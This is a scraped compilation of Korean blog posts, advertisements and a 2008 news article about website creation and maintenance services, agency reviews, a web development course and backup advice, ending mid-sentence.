대표님과 인사를 하고~♡  ​유니크넷은 평택뿐 아니라 수도권 전역에서 홈페이지 제작 관리로 정평이 난 업체라고 하는데요~비결은...대표님이 프로그래머로서 홈페이지 개발 관리 및 서버 관리를 직접 하고있기 때문이라고 해요~♡문제가 생겼을때나 수정이 필요할때 절차가 복잡하지 않고  즉시 해결이 가능한멋진 유니크넷이군요~            홈페이지 제작부터 모바일 쇼핑몰까지..홍보와 매출 확대는 물론 각종 인쇄물까지 논스톱으로 진행하는...창업의 파트너로 손색이 없네요.  ​게다가..유니크넷의 또 하나의 자랑은 바로 탁월한 디자인이라고 하네요.미모의 웹디자인 실장님과 직원분들이 유니크넷을 빛나게 하고 계셨어요~♡실장님 사진은 생략 ㅎㅎ​유니크넷에서 살고있는 예쁜 식물 사진으로 대체합니다..   ​   ​   역시.. 초록이 좋아~♡♡  저 초록 뒤에 숨어있는 유니크넷 분들과 즐거운 배송시간이었습니다.​유니크넷 화이팅!!플랜테리어온 화이팅!!    홈페이지솔루션 (주)빌리언즈 WPMS​안녕하세요디지털 웹에이전시(주)빌리언즈 10억홈피입니다!​무엇이든 만드는 것보다꾸준히 관리하는게사실 더 힘들잖아요?​그래서 오늘은웹사이트를 관리하기 위해 매일 접속하는 홈페이지솔루션 소식을전해드리려고 해요!​ ​홈페이지솔루션과관리자페이지는 비슷한의미라고 해석하시면 됩니다!​웹사이트는 업데이트 되는상황이 많기 때문에 유동적으로관리하기 쉬워야해요~​ ​웹디자이너나개발자가 아니라서관리하는게 너무 복잡하다고 느껴지신다면?​전문가가 아니더라도누구나 쉽게 이용할 수 있는홈페이지솔루션을소개해드리려고해요!​ ​(주)빌리언즈의웹 프로젝트 관리시스템WPMS는 누구나 쉽게웹사이트를 관리할 수있도록자체 개발된 솔루션입니다!​작은 수정사항 때문에업체로 일일이 연락해야한다면무척 번거롭겠죠?​때문에 쉽게 콘텐츠를수정하고 등록할 수 있도록만들어진 솔루션이에요!​ ​우선 로그인을해야겠죠? 관리자페이지를 로그인해서 들어가볼게요~​ ​그럼 이렇게 대시보드에 방문자수그래프가 먼저 보이죠?​총 게시물, 방문자수,회원가입 수가 숫자로표시되어있고회원들이 남긴 최근 게시물도바로 확인이 가능합니다!​ ​일반 회사 홍보사이트같은 경우에는 간단한기본 제공 모듈만으로도충분해요!​하지만 제품을 판매하는쇼핑몰 같은 경우에는복잡한 기능들이 많기 때문에다양한 유료제공 모듈을지원해드리고 있어요!​혹시 간단한 텍스트수정사항도 어디에서해야할지 몰라 찾아헤매셨다면?​ ​WPMS 문서관리에서는이렇게 쉽게 텍스트 수정,이미지 첨부가 가능해요!​수정하시고 저장버튼만 누르면 끝!엄청 간단하죠?​ ​방문자들을 위한이벤트를 알리거나 휴일, 배송 등 중요한 공지사항을 알릴때꼭 필요한 기능이 팝업기능이죠~​ ​팝업 등록도 간단하게하실 수 있어요~​물론 유지보수 서비스를이용하고 계시다면팝업 디자인 제작과 등록까지 해드리고 있습니다!​ ​웹사이트만으로도마케팅 수단으로 이용할 수있도록 방문자 통계 기능을제공하고 있어요!​날짜별로 방문 횟수와방문자 수를 확인해보실 수 있습니다!​모듈마다 TIP 내용이있어 어려움 없이 쉽게 기능을 파악하실 수있을거에요~​ ​​(주)빌리언즈라는키워드로 많이 찾아주셨어요~​이렇게 키워드 통계를통해 어떤 단어로 검색해서웹사이트를 방문했는지체크해보실 수 있어요!​ ​사이트별 방문자통계 기능은 어떤 사이트에서어떤 키워드로 검색했는지알 수 있기 때문에 마케팅측면에서 굉장히 유용하겠죠?​네이버와 구글 애널리틱스의소스만 알려주시면 관리자페이지에서도 등록이가능하기 때문에 모든 통계를 한눈에 보실 수있습니다!​ ​회원관리에서는등급, 문자발송 등의기능을 지원하고 있으며,전체 회원을파악하실 수 있습니다!​ ​임대형 솔루션은제작이 쉽고 빠르지만결정적으로 디자인이 한정적이고 프로그램추가가 안되거나 많은 비용이발생하는 경우가 많아요~​하지만 독립형인WPMS에서는 언제나원하시는 디자인을 적용하실 수 있습니다!​그럼 이제추가되는 유료모듈을 잠시 살펴볼까요?​ ​(주)빌리언즈에서쇼핑몰제작시 유료로제공되는 모듈입니다!​판매에서 가장 중요한기능 중 하나가 주문,배송이죠~배송준비주터 발송,취소, 환불까지 전부관리하실 수 있어요!​ ​매출 현황을 전부살펴볼 수 있고업체가 여러개라면 등록된업체별 매출현황도살펴보실 수 있습니다!​쇼핑몰제작에서중요한 전자결제(PG)심사까지 지원해드리고 있어요!​ ​일반적으로 홈페이지상단에 오는 카테고리도쉽게 관리하실 수 있습니다!​어떤 카테고리가 가장인기있는지 인기도 또한표시되어있어요~​ ​웹사이트 제작 이후관리때문에 골치아프셨다면?WPMS로 이제 쉽게 관리해보세요!​제작 후  홈페이지 솔루션과 메뉴얼을 기본으로제공해드리고 있습니다!​하지만간단한 수정사항 이외오류가 발생하거나디자인 업데이트가 필요하다면?​ ​웹사이트 제작 후제공해드리는 무상 유지보수서비스를 이용하시면고정인력 없이도 쉽게관리하실 수 있습니다! 이제 홈페이지 관리로많은 시간과 인력 낭비할 필요없이 제작부터 관리까지탄탄한 곳에서 맡겨보세요!​홈페이지솔루션 궁금하다면?↓​  ​ (주)빌리언즈광주 홈페이지, 쇼핑몰 제작 기업. 반응형웹, 홈페이지 제작, 유지관리, 쇼핑몰 제작, 온라인마케팅billions.wcms.kr 천안소방서 인터넷 홈페이지 관리 ‘엉망’2008년 04월 17일 (목) 10:59   뉴시스   【천안=뉴시스】 충남 천안소방서 인터넷 홈페이지에 인터넷 도박과 낯 뜨거운 성(性) 광고 등 상업광고가 무분별하게 실려 빈축을 사고 있다.17일 천안소방서 홈페이지(http://chonan.cn119.go.kr)를 보면 누구나 확인 할 수 있는 '보도자료'와 '사진자료' 코너를 운영하고 있으나 확인결과 '인터넷 도박'과 '미팅만남' 등 각종 스팸 성 게시물만 가득한 것으로 드러났다.시민들의 참여로 소방공무원들의 숨은 공로를 알리기 위한 '칭찬합시다'와 '아이디어 공모방'코너도 지난5일부터 '사채대출'과 '현금게임' 등 20여건의 상업광고가 무분별하게 실려 있지만 전혀 관리가 이뤄지지 않고 있다.천안소방서를 소개하는 소방대상물 현황과 소방공무원 현황 역시 각각 지난2006년 1월과 지난해 1월 기준으로 만들어진 자료들을 게시해 눈살을 찌푸리게 하고 있다.시민 A씨(36.성정동)는 "이용객들에게 도움을 주기는커녕 홈페이지를 찾아들어간 이용객들에게 짜증스럽게 하고 있어 개설 취지와는 달리 전혀 도움을 주지 못하고 있다"고 비난했다.천안소방서 관계자는 "최근 홈페이지의 문제점이 지적됨에 따라 자체 관리를 위한 전담팀 구성을 계획중이며 상업성 광고물을 게재할 수 없도록 방화설정 등 홈페이지를 보수 중에 있다"고 말했다.이종익기자 007news@newsis.com    커리어 성공전략⑫개인 경력관리 홈페이지 구축  자신의 지식·정보 널리 알리는 효과이력서 한두 장만으로 인재를 채용하기 어려운 시대가 됐다. 21세기 기업 최고의 화두는 핵심 인재 유치와 관리다. 그래서 요즈음은 기업이 직접 인재 발굴에 앞장서고 있다. 하지만 정작 학벌만으로 채용하거나 이력서 한두 장만으로 모집할 인력의 경력과 능력, 그리고 성장성을 평가하기에 너무 부족하다. 개인으로 봐서는 어떤가. 뛰어난 능력을 갖고 있어도 학벌·학력 등의 제한으로 정상 루트를 통해 원하는 기업에 입사하기가 쉽지 않다. 입사 관문을 통과했더라도 개인과 기업의 기대치는 동상이몽이기 쉽다. 그만큼 개인과 기업의 입장에서 서로 기대하는 바가 다르기 때문에 불협화음이 발생할 수 있는 소지도 분명히 있다. 실제로 서로에 대한 기대치와 만족도가 낮기 때문에 이직하는 경우도 적지 않다. 하지만 눈앞에 닥친 취업이나 이직 문제에 급급하기보다 좀 더 장기적인 안목으로 자신의 직무 지식을 축적하고 자신의 흥미와 관심 분야의 지식을 장기적으로 구축, 자기 관리를 하는 것이 중요하다. 그러기 위해서는 자신의 커리어 히스토리를 기록할 수 있는 인터넷 홈페이지가 필요하다. 오프라인의 이력서만으로 경력을 부각시키는 데에는 한계가 있으므로 온라인으로 자신의 직무 지식과 관심 분야의 지식을 축적·보관할 수 있는 공간을 확보할 필요가 있다. 커리어 홈페이지를 갖게 되면 취업이나 이직에서도 경쟁자보다 유리한 위치를 차지할 수 있다. 첫째, 홈페이지를 갖고 있다는 것 자체가 가점이 된다. 둘째, 비주얼한 디자인으로 인사 담당자를 사로잡을 수 있다. 셋째, 경쟁자와 차별화한 실무 능력을 강조할 수 있다. 넷째, 자신의 지식과 정보를 충분히 제공할 수 있다. 이로 인해 채용되더라도 채용 쇼크(job shock·취업 후 자신과 기업 문화 사이에 발생하는 괴리감)를 줄일 수 있다. 커리어 홈페이지를 구축하는 목적은 경력 관리·자기 계발이다. 그러면 개인 경력 관리 홈페이지를 구축함으로써 장기적으로는 어떤 장점이 있을까. 첫째, 정보 공간 확보가 가능하다는 점이다. 이력서 한두 장으로 표현할 수 없는 자신의 경력·능력 등의 정보를 기록할 인터넷 공간을 확보할 수 있다. 둘째, 뛰어난 시각성과 비주얼한 요소를 지녔다는 점이다. 디자인적인 장점으로 인해 인사 담당자에게 호감을 줄 수 있다. 셋째, 타인과의 차별화를 꾀할 수 있다는 점이다. 미니 홈페이지가 유행하면서 개인 홈페이지가 급속히 보급됐지만 자신의 실무 지식을 체계적으로 개인 홈페이지에 축적해 놓은 사람은 불과 0.01%도 안 될 것이다. 희귀성으로 인해 타인과의 차별화를 이끌어 낼 수 있다. 넷째, 자신의 지식 축적·관리가 가능하다는 점이다. 사실 이 부분이 가장 중요하다. 우리는 수많은 정보를 받아들이지만 정작 자신의 것으로 만들지 못하고 있다. 경력 관리를 위해 자신이 잘 알고 있는 지식이나 경험을 자신의 글로 기록하는 것은 대단히 중요한 일이다. 그로 인해 자신만의 고유 분야를 개척해 나갈 수 있다. 다섯째, 실무 정보를 교환하고 인맥을 구축할 수 있다는 점이다. 막상 직장에서 일하다 보면 자신의 직무와 전혀 다른 요구가 주어지는 경우가 많다. 가령 회사 홈페이지만을 전문적으로 제작하는 웹 기획자가 경영진의 요구로 어느 날 갑자기 쇼핑몰이나 커뮤니티 사업을 위한 기획서를 작성해야 하는 경우와 같이 새로운 분야의 실무 지식을 필요로 할 때가 있다. 이렇게 단시간 내에 새로운 분야의 실무 지식을 습득할 수 있는 가장 효과적인 방법은 해당 분야에 능통한 실무 전문가를 찾아 업무적인 도움을 얻는 일이다. 커리어 홈페이지를 활용하면 각 분야의 실무 전문가와 인맥을 구축, 관련 정보나 업무 지식을 교환할 수 있다. 여섯째, 효과적인 자기 PR가 가능하다는 점이다. ‘앞으로는 개인도 검색 엔진을 통해 검색되지 않으면 뒤처질 것’이라는 것이 미래학자들의 주장이다. 자신의 브랜드를 적극적으로 홍보하지 않으면 기업도 발굴하고자 하는 인재를 찾기 어렵게 될 것이다. 자신만의 정보를 구축해 나가라. 방법은 간단하다. 오늘부터 자신의 실무 지식과 정보 기록을 시작하는 것이다. 〈정철상 컨설턴트·파워잡 본부장 james@powerjob.co.kr〉​요즘은 소상공인 분들도 온라인 사업장이 필수가 된 시대인데요(온라인 사업장이란 홈페이지를 뜻합니다)소상공인 분들에게 유익한 정보가 될 거 같아 이번 포스팅은반응형홈페이지제작 업체 후기를 남겨봅니당 ^^​​  반응형 홈페이지제작 업체 추천 ​제가 이번에 준비하는 것들이 있어서 홈페이지제작업체 알아보고 있었는데홈페이지제작 사기업체가 많다는 말을 하도 많이 듣다 보니 저도 꼼꼼히 알아보게 되더라고요 ㅠㅠ​제가 홈페이지제작 업체를 고를 때 중요하게 생각했던 부분이1. 홈페이지제작 비용2. 홈페이지의 퀄리티3. 컴맹인 제가 혼자서 홈페이지 관리가 가능한지이 3가지를 중요하게 생각하고 여기저기 업체에 상담을 많이 받아봤어요​a업체는 부담없는 비용으로 12~24개월 납부하는 방식이었고, 홈페이지를 제작하면파워링크, 블로그 광고를 다 해주신다고 하더라고요그래서 업체 포트폴리오를 확인 할 수 있냐, 파워링크 순위는 얼마나 올려주시냐, 키워드는 어떤 키워드를 넣어주시냐 여쭤봤더니 말을 빙빙 돌리시더라고요....ㅋㅋㅋㅋㅋㅋ싼 게 비지떡이라고 여긴 저랑 맞지 않는 거 같아서 다른 업체를 알아 봤어요​​ b업체에 상담할 땐 아예 제가 원하는 홈페이지를 보여드렸더니비용이 생각보다 굉장히 비싸지는 거에요 ㅠㅠ  ​그래서 마지막은 지인이 추천해준 홈페이지제작 오아시스라는 곳에 연락을 하게 되었습니당이 곳은 우선 제 지인도 여기서 반응형홈페이지를 제작하였고,지인이 추천하는 곳이라 믿음이 가더라고용​​​ 홈페이지제작업체 홈페이지제작 오아시스 ​그러고 또 제가 믿음이 갔던 게 이천도자기축제, 군청, 시청, 대학교, 인제빙어축제 등규모있는 곳 홈페이지를 많이 제작한 업체더라고요홈페이지를 들어가면 포트폴리오도 많이 준비 되어 있어서 깐깐한 제가 믿음이 간 업체입니당!!ㅋㅋㅋ​​ 왁싱샵/네일샵/뷰티샵 홈페이지제작 ​제 지인이 제작한 반응형홈페이지인데용~ 홈페이지 디자인도 깔끔하고컴맹인 저도 쉽게 관리할 수 있는 관리자모드가 전 굉장히 맘에 들었습니다!!예약상담 확인, 팝업 등등 제가 혼자서 핸드폰으로도 관리할 수 있어서 좋더라구요​반응형 홈페이지란 컴퓨터, 핸드폰, 테블릿 등 어떤 기기에서든알맞는 화면으로 보여지는 것을 말합니당 *^^*​​​홈페이지제작을 준비하고 계신 분들에게 많은 도움이 되길 바라며홈페이지제작 업체 선정할 땐 비용, 실력, 서비스 등 다양하게 비교하며성공적인 홈페이지제작 하시길 바랍니당 ^^​   ​​ 의정부,노원,강북,양주,동두천,포천 홈페이지제작 오아시스홈페이지제작 오아시스 의정부,노원,강북,양주,동두천,포천 홈페이지제작 온라인광고대행사www.500bill.co.kr ​ 1. 명칭 변경교육프로그램 → 누리과정 교육프로그램교육도서 → 누리과정 교육도서완료되었습니다. 2. 현재 교육프로그램 메뉴 기능을 복사한 형식으로 누리과정 교육도서메뉴를 만들어 주시되이 부분은 누리과정 교육도서에만 넣어주시고 누리과정 교육프로그램메뉴에는 빼주세요.이하 나머지는 전에 부탁드린 내용과 동일합니다.완료되었습니다.노란색바 메인메뉴는 일전에 각 메뉴가 동일한 width를 가지고 가운데 정렬을 원하셨는데..지금 상태도 나쁘지 않은 것 같아.. 작업을 줄였습니다.비용을 줄여드린 만큼 감안해주셨으면 좋겠습니다. 3. 교육도서의 나눔정보는 삭제하고 누리과정은 교육자료로 보내주세요.완료되었습니다. 4. 누리과정 교육프로그램과 누리과정 교육도서에 있는 글의 순서를 쉽게 바꿀 수 있도록1) 이 부분은 도저히.. 이 견적으로 진행할 수 없습니다.별도로 순서조정기능 웹프로그램을 짜야하기 때문입니다.다만, 기존 기능을 활용하여..좌측 서브메뉴 목록이.. 게시판 글의 등록일을 기준으로 정렬되도록 조취했습니다.번거롭지만, 순서조정이 가능할 것입니다.게시판 글 수정에서 등록일을 수정하면.. 가장 최근 것이 제일 위로 나올 것입니다.2) 노란색 메뉴바 메인메뉴의 '교육프로그램', '교육도서' 링크경로 자동화앞으로는 각 메뉴의 게시글 중 가장 최근 게시글을 자동으로 찾아갑니다.5. 상세페이지 클릭하면 동영상으로 가는 문제 해결해결되었습니다.전주홈페이지제작 / 홈페이지 관리 / 홈페이지 유지보수 브이디자인http://www.vdesign.kr전북 전주 홈페이지제작업체 브이디자인전북 전주 홈페이지 제작업체/관리, 쇼핑몰 제작/관리, 웹솔루션, 웹프로그램, 개발, 웹디자인, 홈피제작, 견적, 제작비용www.vdesign.kr2년 전쯤에 KT돔이라는 회사의 권유로 합천봉황농원이라는 한글 도메인으로 홈페이지를 관리하려 했다. 딸의 도움을 받으면 어떻게 운영할 수 있을 것으로 시작했으나 조금지나 그 생각이 잘 못되었다는 것을 알게 되었다. 그리고 나서 홈페이지 관리가 허술하다가 끝내는 열리지 않은 페이지로 전락한 줄도 모르고 살았다. 그런데 엊그제부터 여러가지 마케팅활동때문에 바쁜 와중에 성가시다 싶을 만큼 잦은 전화로 설득하는 바람에 일하다 말고 PC앞에 앉아 전화받으면서 홈페이지 관리를 주식회사 엔씨티 홍성나 주임이 잘 해줄 것을 믿고 홈페이지를 다시 개장하기로 했다. 요즘의 마케팅에서 인터넷을 빼면 말이 않된다는 것을 익히 들어 알고 있기에 서둘러 블로그를 운영하고 이를 관리하기 위해 매일 저녁 이렇게 글을 올리고 있는게 아니던가? 소비자에게 좀더 가까운 이웃으로 다가가기 위해 우리농장의 일상을 되도록 소상히 올리고 있다. 그리고 이러한 이웃이 생산하는 농산물과 이의 가공품에 대한 확실한 이해를 돕기위해 소비자가 궁금해 할 사항을 찾아 글로 올릴 것이다. 아울러 홈페이지도 많은 소비자들의 사랑받는 인터넷 장이 되길 기대한다.홈페이지제작은 관리까지 가능한곳으로​안녕하세요.홈페이지제작 및 통합마케팅그로웹 (groweb) 입니다.​홈페이지제작은 사업을 처음 시작하거나마케팅을 시도하려고 하는 분이 많습니다.정확한 정보를 전달할 수 있으며 긍정적인이미지를 인식시키고 매출로 자연스럽게이어질 수 있기 때문입니다.​큰 비용이 들어갈 수도 있지만적고 합리적인 비용으로도 충분하게홈페이지를 만들 수 있다는 사실을아시나요?​ 홈페이지제작은 큰 비용이 들어가는 일로 알고 계신 분도 많겠지만단 10만 원의 합리적인 비용으로  가능한 곳도 있습니다.비용이 적다고 수준 낮은 품질의 공장에서 찍어내는 양산형의 홈페이지가아닌 일반형부터 자사에 어울리는 반응형과 랜딩형 페이지로 제작할 수 있습니다.​반응형과 랜딩형으로 제작하는 것은 중요한 부분입니다.PC로도 검색 후 정보를 습득하지만 스마트폰이나태블릿을 통해서도  정보를 습득하게 됩니다.​각 기계에 맞춰서 가장 보기 편안한 방법으로 제공된다면 편할 것입니다.그로웹은 기기에 맞춰 보기 편안하게 반응하도록 제작할 수 있습니다. 홈페이지제작에서 도메인은 중요하게점검해봐야 하는 점입니다.이미 큰 비용을 지불하고 만들었는데도메인 비용을 계속해서 지급해야 한다면금전적인 부담을 느낄 수 있습니다.​그로웹은 도메인을 무료로 등록해드리며명의는 개인이 직접 소유가 가능합니다.비용을 절감하기 위해서 저렴한 업체를선정했을 때 도메인 같은 부분에서더 많은 비용을 지출하는 사례들이 많으니확인하시길 바랍니다. 합리적이고 저렴한 비용으로 대충홈페이지제작을 하는 것은 아닌지의심해볼 수 있습니다.그로웹은 오래된 경력에 기획자와개발자, 디자이너가 투입해 긍정적인 이미지와 인식을 줄 수 있고신뢰감을 줄 수 있도록 제작합니다.​단순하게 제작만 하는 것이 아닌업종에 대한 이해도가 높아 컨설팅에도움을 주고 어떤 방향으로 진행하면 좋을지도 제시해주고 함께 성장해갈 수 있도록 진행합니다.제작을 의뢰할 때는 시안을 선택하고모든 과정에서 의뢰인과 끊임없이 소통하고 공신력이 있는 페이지를만들기 위해서 각 분야의 전문가가최대의 기량을 발휘하고 있습니다. 소통은 중요한 부분으로 제작 후에 수정할 부분이나 추가해야 할 부분이생겼을 때 빠르게 수정, 등록이 가능합니다.처음 만들 때 시안 수정도 가능하고가장 마음에 들 때까지 검수하고 또 합니다.​제작부터 관리까지 한 번에 진행하는 곳과하는 것이 중요한 이유가 있습니다.제작과 관리가 다른 곳에서 이루어진다면제대로 된 피드백을 받는 것이 어려우며수정에 큰 어려움이 생기고 시간이 오래걸려 잘못된 정보를 전달해 혼란을 줄 수 있고자사에 좋지 못한 영향을 줄 수 있습니다. 홈페이지제작은 제작부터 관리까지한 번에 이루어지는 그로웹을 통해서 진행하는 것이 좋습니다.​자사에 좋은 이미지를 만들고 꾸준하게노출이 된다면 매출에도 큰 영향을 주며소비자들에게 신뢰를 줘 더 많은 소비자의유입과 매출을 노려볼 수 있습니다.​전 세계적으로 어렵고 험난한 시기를보내고 있는 소상공인이나 개인사업자를응원합니다!​​​​유선 상담 : 070-7353-1763​​상담신청서 작성하기▼ [그로웹] 홈페이지 제작 상담신청서안녕하세요. 웹에이전시 그로웹입니다. 그로웹은 기획자, 디자이너, 개발자, 마케터가 함께 프로젝트에 참여하여 원하시는 목적에 맞는 홈페이지를 제작해드리고 있습니다. 검색엔진 최적화(SEO) 및 퍼포먼스 마케팅, 마케팅 자동화 등 비즈니스가 성장할 수 있도록 다방면의 지원을 해드리는 마케팅 회사이자 홈페이지 제작사 입니다. 랜딩페이지, 쇼핑몰, 홈페이지제작 관련하여, 상담 진행에 필요한 내용을 상세하게 작성해주시면 빠른 시간 내로 담당자가 배정되어 견적서 및 진행 관련 상세한 상담을 도와드리도록 하겠습니다. 서비스 소개서 : http...docs.google.com 채널톡 실시간 문의▼ 그로웹홈페이지제작 및 통합 마케팅 컨설팅 그룹groweb.channel.io ​   안녕하세요^^동성직업전문학교입니다. 점심을 부실하게 먹었는지 아직 저녁시간이 좀 남았는데 배가고파오네요~저녁 때 폭식이 예상됩니다만... 절제해야겠죠!!왜냐하면 우리에겐 핫한 여름휴가가 기다리고 있으니까요^.^ 여러분들은 어디로 휴가를 떠나시나요??공부도 공부고~ 취업준비도 해야하긴 하지만이렇게 더울 땐 휴가를 한번 떠나주는 것도 오히려 더 도움이 될 것 같아요!!가끔은 머리도 몸도 휴식이 필요하니까요!! 휴가를 생각하며~ 힘을 꾹꾹 짜 내어 오늘도 열심히알차고 좋은 정보 전해보도록 할게요!!  인터넷이 없으면 어떨까요?상상도 할 수가 없죠~ 모든 회사, 가정, 학교 등등인터넷을 사용안하는 곳이 없기 때문에 정말 인터넷이 없는 세상은 상상도 못할거에요.이렇다보니 웹이나 홈페이지, 모바일 앱으로 관심 있으신 분들이 많이 있으실텐데요.정말 요즘같은 시대에는 많은 관심을 받는 유망직종으로 떠오르고 있습니다. 부산홈페이지관리개발자 동성직업전문학교에서오늘 이러한 것들을 모두 배우고 익힐 수 있는 교육과정을 안내해드리겠습니다^^ 일단, 우리 동성에서 진행하는 교육과정은 국가주도로 실시하는 훈련에 해당됩니다.국가전략산업 중 인력이 부족한 직종에 대하여 훈련을 실시하여 산업현장이 효구하는미래산업 청년리더를 양성하는 것을 목표로 하고 있습니다!! 따라서, 교육을 수강하는 드는 교육비, 교재비, 실습비는 전액무료입니다.국가에서 모두 지원 받으실 수 있고, 일정 출석률을 채워주시면 수당도 지급하고 있습니다. 그럼 자세한 커리큘럼을 살펴보도록 하겠습니다.    홈페이지를 개발하고 관리하는데 필요한 기본적인 내용부터나아가 웹 뿐만아니라 모바일웹 앱까지 배울 수 있는 교육과정입니다.이는 한번에 두마리 토끼를 잡는 것인데요~ 일단 배우다 보면 자신의 적성이나성향에 맞는 분야가 있게 될 것입니다. 그렇게 되면 그 분야를 좀 더 살려서 키워나가시면 됩니다.웹과 모바일을 한번에 배울 수 있는 좋은 기회입니다.    교육과정의 마지막에는 최종프로젝트 단계가 있습니다.여기서는 팀별로 그동안 배운 것들을 응용하여 하나의 아이템을 정해 프로젝트를 수행하고발표회를 가지게 됩니다. 이 발표회에는 취업연계 기업체들이 직접 참여하게 됩니다.발표회 후에는 채용면접이 있게됩니다.    그야말로 한번에 교육에서 취업까지 연계할 수 있는 과정이라고 볼 수 있습니다.아래는 취업업체 목록입니다.    총 모집인원은 25명으로 벌써부터 많은 문의가 있습니다.홈페이지 개발이나 모바일 앱 개발 등 관련 분야로 관심이 있으시거나취업을 원하시거나 창업을 원하시는 분들도!! 많은 도움이 될거라고 생각됩니다. 망설이지말고 도전하세요!!동성직업전문학교가 여러분위 꿈을 이루어 드립니다.     부산홈페이지관리개발자 동성직업전문학교051. 933. 3400       홈페이지 제작 및 관리, 지식 모음집반드시 명심하세요! 홈페이지 백업에 대해!같은 문제일지라도 나의 지식의 정도에 따라 그 이해도가 달라집니다.그만큼 지식습득이 중요하다는 거죠~오늘은 여러분께 도움이 될만한 홈페이지제작및관리에 대한 좋은 지식을 모아봤습니다. 함께 알아볼까요?홈페이지 관리 중 컨텐츠나 페이지를 부주의로 삭제했을 것을 대비해 백업 작업은 필수에요.홈페이지를 미리 백업해 놓았다면 언제든지 원상복원이 가능합니다.또한, 홈페이지가 해킹되어 문제가 나타났을 경우 백업 파일을 불러와 복구가 가능합니다.따라서 홈페이지를 관리 하신다면 백업은 꼭 꾸준하게 진행되어야 합니다.어느 정도 업체 규모가 있는 웹호스팅 회사는 자체 백업 프로세스가 있으므로업체 선택 시 참고하시기 바랍니다.홈페이지 기획물을 전문업체에 맡겼을 시에는 백업 계약도 약정해 놓으시면 좋은데요.계약 목록에 일정한 기간마다 백업 파일을 제공받기로 명시해 둔다면,각종 파일과 소스를 보장받을 수 있답니다.자신이 만든 무료홈페이지 계정 공간 상에 보유한 파일들을 올리는 방법은 내 개인 컴퓨터에 저장되어 있는 파일을 웹 서버상에 보내서 저장 시키는 것입니다.모바일 홈페이지 제작에 대해 알아볼까요?최근 스마트폰을 사용하는 사용자가 많은 만큼, 만들어진 홈페이지가 PC뿐 아니라 모바일 상에서도 호환시키는 것이 좋습니다.모바일 홈페이지 제작의 중요성이 증대되면서 많은 분들이 대행업체를 통해서 제작을 하고 있는데요.계약 전 오타에 대한 부분은 반드시 대행업체의 책임으로 해야오타 수정으로 인한 추가 비용이 발생되는 것을 막을 수 있어요.모바일 홈페이지 제작 업체 결정 시에는 거래계약서 사항의 유지 보수 비용 표준 및 소유권 인정에 대해 꼼꼼하게 따져봐야 합니다.또한, 초기 계약 비용도 확인하셔야 하는데요.무작정 저렴한 곳만 찾아서 할 경우에는 이후 추가 비용이 2배로 발생되거나 느린 피드백으로 시간낭비를 하게 될 수도 있습니다.제작 업체를 알아볼 경우라면 회사의 규모도 중요합니다.큰 업체일수록 관리적 체계가 잘 잡혀 있기 때문에 제작 후 관리도 확실하게 진행될 수 있답니다.가장 효율적인 쇼핑몰 제작을 원한다면? 원데이넷 서비스를 이용하세요!원데이넷은 손쉽게 쇼핑몰을 만들 수 있는 독립형 솔루션 하이센스 2.0을 제공합니다.하이센스 2.0은 급변하는 웹 트렌드에 발맞춰 제작된 솔루션이에요.코딩 시스템이 쉬워 작업자가 관리하기 편하며,모바일 기기 크기에 따라 달라지는 특별한 화면으로 고객 편의성도 높습니다!원데이넷 하이센스 2.0으로 사용자 관리자 모두에게 최적의 모바일 샵을 경험하세요!구매 시 평생 라이선스를 소장할 수 있는 실속 있는 서비스!늘 부담 없이 저렴한 금액으로 소개합니다.괴테는 ‘무미건조한 상상력보다 끔찍한 것은 없다.’라는 명언을 전했습니다.평생을 똑같은 생각과 고민만 한다면 그것만큼 고리타분한 것도 없겠죠?오늘 읽어본 홈페이지제작및관리 내용처럼 가끔은 새로운 분야에 대해서도 공부해 보세요.새로운 것을 알아가며 발상이 전환되는 계기를 만나게 될지도 모르니까요. ^^김해홈페이지제작 김해웹이퀄리티를 보장해드립니다​안녕하세요 홈페이지 전문 제작업체인 김해웹입니다.저희 김해웹은 완성도 높은 홈페이지 제작 및안정적인 홈페이지 운영을 돕기 위해 다양한 마케팅을지원해드리고 있습니다. 왜? 김해웹이 특별한지소개를 하도록 하겠습니다.​ ​김해웹은 기본적으로 각자만의브랜드 컨셉에 맞게 맞춤형으로디자인과 구성을 진행하고 기획을 합니다.​홈페이지는 각 회사만의 첫인상과 분위기를결정할 수 있는 수단이기 때문에방문할 때 얻고자 하는 정보가 있는지,전문성이 있는지 방문자들이홈페이지를 통해 특정과 파악을 한답니다.​ ​김해웹에서는 브랜드의 특성에 맞는컨텐츠를 기획하고 제작을 하여 방문자들이얻고자 하는 정보를 쉽고 빠르게 찾을 수있도록 기획하고 있습니다.​홈페이지 제작을 위해 가장 중요하게 생각하는 것은바로 제작하는 의도에 맞는 목적에 따라서홈페이지를 만드는 것이 가장 중요합니다.​ ​김해웹에서는 각 브랜드의 특성과 이미지 그리고검색의 최적화까지 책임지는 기획자와홈페이지를 전체적인 구조와 보완 서버 및 호스팅을책임지는 개발자 그리고 UI UX를 책임지는 디자이너들이최고의 홈페이지를 만들기 위해 항상 노력하고 있습니다.​ ​홈페이지 제작을 마치고 개설한다고 끝이 나는 것은 아닙니다.홈페이지 관리하는 것이 더욱더 중요하기 때문에개설하고 난 뒤에는 변경할 이미지나 문구 등수정사항들을 계속 관리해줘야 합니다.김해웹에서는 다양한 피드백을 관리하고 있으며체계적으로 유지 및 보수 서비스 또한 진행하고 있습니다.​​ ​김해웹은 꾸준하게 오랜 경력을 유지하며신뢰와 믿음을 받고 있습니다.다양한 경험으로 생긴 노하우로 해당기업에 맞는 이미지를 최신 트렌드에 맞게구성하여 널리 알릴 수 있는 홈페이지를만들어드리도록 하겠습니다.​ ​합리적인 비용으로 성공과 발전을 위한홈페이지를 제작하여 유지 보수까지 최선을다해 진행해드리겠습니다.김해홈페이지제작 최고의 홈페이지를만들어드리겠습니다.​ 김해웹경상남도 김해시 흥동로171번길 20  ​ 네이버 블로그는 맞지만, 확인불가  여름 하면 여름휴가! 그리고 이 여름휴가는 곧 물놀이로 이어집니다. 근데 이것도 이제 옛말이죠. 사람들은 이제 이러한 정석적인 코스를 밟지 않습니다. 1년 중 가장 많은 사람들이 이동하는 여름 휴가철에 언제나 바다와 계곡과 같은 한정적인 곳으로 모이다 보니 어딜 가나 복잡하고 시끄러워 휴가 다운 휴가를 보낸 적이 걱의 없다고 볼 수 있죠. 그래서 이제 많은 사람들인 단순 물놀이가 아니라 펜션 하나를 잡아서 며칠 동안 풀에서 물놀이도 하고 바비큐 파티도 하고 밀린 책을 읽는 등 힐링 그 자체를 하는 것을 선호합니다. 이러한 현상은 곧 전국에 펜션의 붐을 일으키고 본격적인 경쟁 체제로 들어서게 하였는데요. 마케팅 시대에 살고 있는 만큼 경쟁은 곧 마케팅의 충돌이기도 합니다. 오늘 